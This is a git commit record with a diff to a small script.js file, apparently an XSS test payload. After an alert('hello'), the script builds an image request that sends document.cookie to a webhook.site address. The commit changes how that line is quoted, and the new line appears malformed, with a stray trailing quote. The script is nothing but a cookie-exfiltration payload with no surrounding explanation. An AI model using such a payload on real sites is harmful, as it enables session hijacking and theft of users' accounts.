a84de2563bd0ceb43ea5a061f9a888a4e49feb68
slowsheep1 <siyuanivan@gmail.com>
2024-02-15 14:11:41 +0800

    load image

--- script.js
+++ script.js
@@ -1,3 +1,3 @@
 alert("hello")
 var img = new Image();
-img.src="https://webhook.site/39f45cc0-915a-47a5-9cf6-e54c4b6ab8c3?c='+document.cookie+'"
+img.src="https://webhook.site/39f45cc0-915a-47a5-9cf6-e54c4b6ab8c3?c="+document.cookie"
